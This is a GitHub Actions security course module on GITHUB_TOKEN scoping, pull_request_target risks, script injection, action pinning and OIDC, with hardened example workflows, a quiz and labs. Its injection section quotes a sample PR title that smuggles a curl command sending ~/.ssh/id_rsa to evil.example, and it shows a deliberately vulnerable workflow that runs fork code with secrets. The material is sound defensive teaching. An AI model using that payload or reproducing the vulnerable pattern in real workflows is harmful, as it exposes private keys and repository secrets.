# Module 24: Supply Chain Security and `GITHUB_TOKEN`

![Module](https://img.shields.io/badge/Module-24-1f6feb?style=flat-square) ![Part](https://img.shields.io/badge/Part%20C%20Platform-bf3989?style=flat-square) ![Level](https://img.shields.io/badge/Level-Advanced-cf222e?style=flat-square) ![Time](https://img.shields.io/badge/Time-150%20min-555?style=flat-square)

> Navigation: [Course Home](../README.md) | [Module Index](./README.md) | [Previous: Module 23](./module-23-docker-publish.md) | [Next: Module 25](./module-25-environments-approvals.md)
> Level: **Advanced** | Time: **150 min** | Example workflow: [`module-24-supply-chain-security.yml`](../examples/module-24-supply-chain-security.yml)
> Solutions: [`module-24-solutions.md`](../solutions/module-24-solutions.md)

## Learning Objectives

- Explain what `GITHUB_TOKEN` is, what it can do, and when it expires.
- Scope `permissions:` at workflow and job level, and know what setting it resets.
- Recognise and defuse the `pull_request_target` fork-privilege-escalation pattern.
- Prevent expression-based script injection in `run:` blocks.
- Pin third-party actions to immutable refs and justify any exception.

## Key Concepts

`GITHUB_TOKEN`, default permissions, least privilege, `pull_request_target`, script injection, SHA pinning, OIDC, `id-token: write`, supply chain

## Expected Outcome

You can audit a workflow for the four failure modes that cause real Actions incidents, and explain to a colleague why each fix is necessary rather than ceremonial.

## Concept Flow

```text
Untrusted input arrives
      |
      +-- as a PR from a fork ------> `pull_request`         : read-only, no secrets  [SAFE]
      |                              `pull_request_target`   : write + secrets        [DANGEROUS]
      |
      +-- as event text ------------> ${{ github.event.* }} in `run:`  : INJECTION
      |                              passed via `env:`                : safe
      |
      +-- as third-party code -----> `@main`         : upstream controls your CI
                                     `@<full SHA>`   : immutable
```

---

## ELI5 Explanation

Every workflow run gets a temporary key to your repository. Most of the risk in Actions comes from one of two things: giving that key more power than the job needs, or letting a stranger's text be treated as instructions instead of data.

A pull request from a stranger is the interesting case. Normally their code runs with a key that can read but not change anything. There is a special trigger that hands them a key that *can* change things — and that is where accidents happen.

## Technical Explanation

### `GITHUB_TOKEN`

Every run gets an installation token minted automatically. It is not something you create or store. Three properties matter:

- **Scoped to one repository** — the one running the workflow. It cannot reach sibling repositories, which is why cross-repo automation needs a PAT or a GitHub App.
- **Expires when the job finishes**, or after 24 hours at most. A leaked token has a short useful life, but "short" is not "zero".
- **Its pushes do not trigger workflows.** A commit pushed with `GITHUB_TOKEN` will not start another workflow run. This is deliberate loop prevention, and it is also a frequent misdiagnosis — before blaming it for a workflow that did not run, check the run history, because a *disabled workflow* looks identical.

### `permissions:`

The default grant is a repository or organisation setting: permissive (broad write) or restricted (`contents: read` plus `metadata: read`). Never rely on it; declare what you need.

The rule that surprises people: **specifying `permissions:` at all resets every scope you did not mention to `none`.** So this is not "add packages write" —

```yaml
permissions:
  packages: write     # contents is now `none`, not `read`
```

— it is "packages write and nothing else", which will break `actions/checkout`. Declare every scope you need:

```yaml
permissions:
  contents: read
  packages: write
```

`permissions: {}` grants nothing at all, which is the right setting for a job that only reads its own inputs. Job-level `permissions:` overrides workflow-level rather than merging.

### `pull_request` vs `pull_request_target`

This is the single most consequential distinction in Actions security.

| | `pull_request` (fork PR) | `pull_request_target` |
| --- | --- | --- |
| Workflow file used | the **base** repo's | the **base** repo's |
| Token | read-only | **read-write** |
| Secrets available | **no** | **yes** |
| Default checkout | the merge ref | the **base** ref |

`pull_request_target` exists so a maintainer's workflow can label or comment on a fork PR — tasks needing write access. It becomes a vulnerability the moment the workflow checks out and *executes* the PR's code:

```yaml
# VULNERABLE — do not copy
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker's code
      - run: pip install -r requirements.txt               # ...now executed
```

Anyone who can open a pull request can put anything in `requirements.txt`, and it runs with a write token and every repository secret. The fix is to keep privileged work and untrusted code in separate workflows: use `pull_request` to test the code with no secrets, and `pull_request_target` only for metadata operations that never check out the head.

### Script injection

`${{ }}` expressions are substituted into the shell script **before** it runs, as text. Event fields are attacker-controlled:

```yaml
# VULNERABLE
- run: echo "Reviewing ${{ github.event.pull_request.title }}"
```

A PR titled `"; curl evil.example/$(cat ~/.ssh/id_rsa); #` becomes a second command. The fix is to pass the value through the environment, where the shell treats it as data:

```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Reviewing $PR_TITLE"
```

Treat everything under `github.event.*` as hostile: titles, bodies, branch names, commit messages, author names, label names.

### Pinning third-party actions

`uses: some-org/some-action@main` means whoever controls that branch has code execution in your workflow, with whatever permissions you granted. A version tag is better, but tags are mutable and can be re-pointed. A full commit SHA is immutable:

```yaml
uses: some-org/some-action@6f3c981e7b77f235fd2702dd74af25fc4b72bf11 # v3.96.0
```

The trailing comment is not decoration — without it nobody can tell what version they are on. Resolve a SHA with `gh api repos/<owner>/<repo>/commits/<tag> --jq .sha`.

First-party `actions/*` are conventionally referenced by major tag, on the basis that GitHub controls them. That is a risk decision, not a rule; a high-security repository pins those too.

### OIDC

Long-lived cloud credentials in secrets are the thing most worth eliminating. With `permissions: id-token: write`, the run can request a short-lived OIDC token and exchange it for cloud credentials that expire in minutes. See the reusable workflows under [`advanced/reusables/`](../advanced/reusables/) for AWS, Azure, and GCP variants.

## Real-World Use Case

A QA repository ran its Behave suite on `pull_request_target` because contributors' PRs needed the Selenium grid credentials to run. Any contributor could have exfiltrated every secret by editing a `conftest.py`. The fix split it in two: a `pull_request` workflow runs the suite against a mock backend with no secrets, and a separate `pull_request_target` workflow — which never checks out the head — posts the results as a comment.

## When To Use

- Always, for `permissions:`. Every workflow should declare its scopes.
- `pull_request_target`, only for metadata operations on fork PRs that never execute PR code.
- SHA pinning, for every third-party action, especially anything with repository or secret access.
- OIDC, whenever a cloud provider supports it, in preference to stored credentials.

## When NOT To Use

- Do not use `pull_request_target` to run tests on fork code. There is no safe way to do that with secrets attached.
- Do not use `GITHUB_TOKEN` for cross-repository work; it cannot reach other repositories.
- Do not rely on `GITHUB_TOKEN` pushes to trigger downstream workflows; use `repository_dispatch` or `workflow_dispatch` instead.
- Do not add `id-token: write` to jobs that do not authenticate to a cloud — it is a capability, so grant it narrowly.

## Common Mistakes

- Declaring one permission and unintentionally revoking the rest, then debugging a `checkout` failure that looks unrelated.
- Interpolating `${{ github.event.* }}` directly into a `run:` block.
- Using `pull_request_target` with `ref: github.event.pull_request.head.sha`.
- Pinning to `@main` on a security scanner — the tool with the broadest access is the one most worth compromising.
- Pinning to a SHA with no version comment, leaving nobody able to audit or update it.
- Assuming secret masking is a security control. Masking hides a secret from logs; it does not stop a step that deliberately sends it somewhere.
- Storing a long-lived cloud key as a secret when the provider supports OIDC.
- Believing a `workflow_run` workflow is safer because it runs later — it runs with a write token and must not check out untrusted code either.

## Debugging Tips

- A `403` from `checkout` or the API after adding `permissions:` almost always means an unlisted scope was reset to `none`. Add the scope back explicitly.
- The run log's "GITHUB_TOKEN Permissions" block lists exactly what the token was granted; read that rather than reasoning about the defaults.
- To find injection risk, grep for `${{ github.event` inside `run:` blocks: `grep -rn '\${{ *github\.event' --include='*.yml' .`
- `actionlint` flags some injection patterns and unpinned local action paths, but it does not know which versions are current — see the `action-version-review` skill.
- To confirm whether a stale pin still resolves at all, `gh api repos/<owner>/<repo>/commits/<ref> --jq .sha`. A tag that no longer exists fails at runtime with an "unable to resolve action" error, not at lint time.
- If a downstream workflow never fires, check the run list before blaming the `GITHUB_TOKEN` rule; a disabled workflow presents identically.

## Reference: `permissions:` scopes in common use

| Scope | Grant | Needed for |
| --- | --- | --- |
| `contents` | `read` | `actions/checkout` |
| `contents` | `write` | creating releases, pushing tags |
| `packages` | `write` | pushing to GHCR (Module 23) |
| `pull-requests` | `write` | commenting on or labelling a PR |
| `issues` | `write` | creating or commenting on issues |
| `id-token` | `write` | OIDC cloud authentication |
| `security-events` | `write` | uploading SARIF from a code scanner |
| `actions` | `read` | reading other workflow runs and artifacts |

## Minimal Workflow Example

```yaml
name: Least Privilege Demo

on: pull_request

# Declare every scope needed. Naming any scope sets all others to `none`.
permissions:
  contents: read

jobs:
  inspect:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v7

      # The PR title is attacker-controlled, so it arrives via env, never
      # interpolated into the script text.
      - name: Report the PR title safely
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "Reviewing: $PR_TITLE"
```

### YAML Explanation

- `on: pull_request` gives a fork PR a read-only token and no secrets — the safe default.
- `permissions: contents: read` is the minimum for `checkout`; every other scope is `none`.
- `env.PR_TITLE` binds the untrusted value to a variable; the shell then treats it as data.
- `"$PR_TITLE"` is quoted, so even a title containing spaces or shell metacharacters stays one argument.

### Step-by-Step Execution

1. A contributor opens a pull request from a fork.
2. GitHub runs the **base** repository's workflow file, not the fork's.
3. The token is minted read-only; no secrets are exposed to the job.
4. `checkout` succeeds because `contents: read` was granted.
5. The title is placed in the environment and echoed as literal text.

## Production Workflow Example

```yaml
name: Secure PR Gate

on:
  pull_request:
  workflow_dispatch:

# Workflow-level default: nothing. Each job opts in to exactly what it needs.
permissions: {}

jobs:
  # Runs untrusted PR code. No secrets, no write access, by construction.
  test:
    name: Test PR code
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Checkout repository
        uses: actions/checkout@v7

      - name: Set up Python suite
        uses: ./.github/actions/setup-python-suite
        with:
          python-version: "3.13"
          working-directory: your-solution-root-folder-name

      - name: Run smoke suite against a mock backend
        working-directory: your-solution-root-folder-name
        env:
          # A mock, so no real credentials are needed for fork PRs.
          BASE_URL: http://localhost:8080
        run: behave --tags=smoke

  # Scans for committed secrets. Third-party action, so pinned to a SHA.
  secret-scan:
    name: Scan for committed secrets
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Checkout full history
        uses: actions/checkout@v7
        with:
          # A secret scanner needs history; a shallow clone hides older commits.
          fetch-depth: 0

      - name: Scan
        # Pinned to an immutable SHA with the version recorded in a comment. A
        # scanner runs with repository access, so a mutable ref here would hand
        # whoever controls that branch code execution in this workflow.
        uses: trufflesecurity/trufflehog@6f3c981e7b77f235fd2702dd74af25fc4b72bf11 # v3.96.0
        with:
          extra_args: --only-verified

  # Reports results. Needs write access, so it must NOT touch PR code.
  report:
    name: Comment on the PR
    needs: [test, secret-scan]
    if: always() && github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      # Note: no checkout at all. This job has write access, so it never puts
      # untrusted code on the runner in the first place.
      - name: Post result comment
        uses: actions/github-script@v9
        env:
          TEST_RESULT: ${{ needs.test.result }}
          SCAN_RESULT: ${{ needs.secret-scan.result }}
        with:
          script: |
            // Values arrive via env, not string-interpolated into this script.
            const body = [
              '### PR gate results',
              '',
              `- Tests: ${process.env.TEST_RESULT}`,
              `- Secret scan: ${process.env.SCAN_RESULT}`,
            ].join('\n');
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body,
            });
```

### YAML Explanation

- `permissions: {}` at workflow level means every job starts with nothing and must opt in.
- The `test` job gets `contents: read` only — it runs untrusted code, so it holds no capability worth stealing.
- `fetch-depth: 0` is required for history scanning; the default shallow clone would miss older commits.
- The scanner is SHA-pinned with a version comment, so it is both immutable and auditable.
- The `report` job has `pull-requests: write` and performs **no checkout**, which is what keeps write access and untrusted code apart.
- Inside `github-script`, values come from `process.env`, so a hostile PR title cannot break out of the JavaScript either.

### Expected Output

- Three jobs, each listing a different, minimal permission set in its log.
- A fork PR runs `test` and `secret-scan` with no secrets available.
- The `report` job posts one comment summarising both results.
- Removing a scope from `report` reproduces a `403` on `createComment`.

## Quiz

1. A workflow adds `permissions: packages: write` and `actions/checkout` starts failing. Why?
   - **A.** `checkout` requires `packages: read` as well.
   - **B.** Naming any scope sets all unnamed scopes to `none`, so `contents` is no longer `read`.
   - **C.** `packages: write` is invalid at workflow level.
   - **D.** The token expired mid-run.

2. Which combination lets a fork pull request exfiltrate repository secrets?
   - **A.** `on: pull_request` with `permissions: contents: write`.
   - **B.** `on: pull_request_target` that checks out `github.event.pull_request.head.sha` and runs its code.
   - **C.** `on: push` with `secrets: inherit`.
   - **D.** `on: pull_request` with `fetch-depth: 0`.

3. Which is a genuine security control rather than a convenience?
   - **A.** Secret masking in logs.
   - **B.** Not granting the job the secret in the first place.
   - **C.** Naming secrets with a `SECRET_` prefix.
   - **D.** Marking the repository private.

4. A workflow pushes a commit using `GITHUB_TOKEN` and expects a downstream `on: push` workflow to run. It never does. Give the documented reason, and explain why you should still check the run history before accepting that as the cause.

5. Rewrite this step to be injection-safe, and state precisely what an attacker controls:
   ```yaml
   - run: echo "Branch ${{ github.event.pull_request.head.ref }} by ${{ github.actor }}"
   ```

## Labs

| Difficulty | Task | Expected Output |
| --- | --- | --- |
| Beginner | Add `permissions: {}` to a workflow, run it, and add scopes back one at a time until `checkout` and an API call both succeed. | A minimal working permission set, and a recorded `403` for each scope that was missing. |
| Intermediate | Find every `${{ github.event.* }}` interpolated into a `run:` block across `examples/` and `advanced/`, and convert them to `env:` passthrough. | A grep that returns no matches inside `run:` blocks, with behaviour unchanged. |
| Challenge | Write two workflows that together test fork PRs safely: one `pull_request` job that runs the suite without secrets, and one `pull_request_target` job that comments without checking out the head. Document why the split is required. | Two workflows, plus a written explanation of the privilege boundary. |

Solutions: [`solutions/module-24-solutions.md`](../solutions/module-24-solutions.md)

---

[Previous: Module 23](./module-23-docker-publish.md) | [Module Index](./README.md) | [Next: Module 25](./module-25-environments-approvals.md)
